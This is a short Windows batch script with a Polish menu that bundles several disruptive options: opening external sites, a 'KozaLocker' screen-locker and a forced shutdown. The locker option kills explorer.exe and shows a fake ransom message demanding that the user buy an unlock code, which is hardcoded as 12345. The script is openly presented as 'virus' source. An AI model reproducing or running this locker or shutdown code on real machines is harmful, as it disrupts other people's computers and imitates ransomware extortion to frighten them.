@echo off
:poczatek
cls
echo ----------------
echo Wybiesz z listy
echo ----------------
echo.
echo 1) randomowe loncze !
echo 2) koza locker ! (niebezpieczny wirus skid)
echo 3) skid globy x
echo 4) wyjscie ewakuacyjne
echo.
set /p opcja=wybierz:
if %opcja%==1 goto opcja1
if %opcja%==2 goto opcja2
if %opcja%==3 goto opcja3
if %opcja%==4 goto opcja4
:opcja1
cls
echo wybrano randomowe loncze !
start https://random.com/qp
pause
goto poczatek
:opcja2
cls
echo wybrano KozaLocker
taskkill /f /im explorer.exe
cls
echo twuj komputer zostal zablokowany przez KozaLocker
echo rzeby go odblokowac musisz kupic kod odblokowujoncy
set code=""

:code
set /p code="Wpisz kod:"
if "%code%"=="12345" goto correct
if NOT "%code%"=="12345" goto wrong

:correct
start explorer
echo Kod prawidlowy
pause
exit

:wrong
echo Kod nieprawidlowy, sprubuj jeszcze raz
goto code
pause
goto poczatek
:opcja3
cls
echo skid globy x
start https://rajdowniatk.ct8.pl
pause
goto poczatek
:opcja4
cls
echo wybrano wyjscie ewakuacyjne
shutdown /s 
pause
:zly_wybor
echo twoj ojciec !
pause
goto poczatek
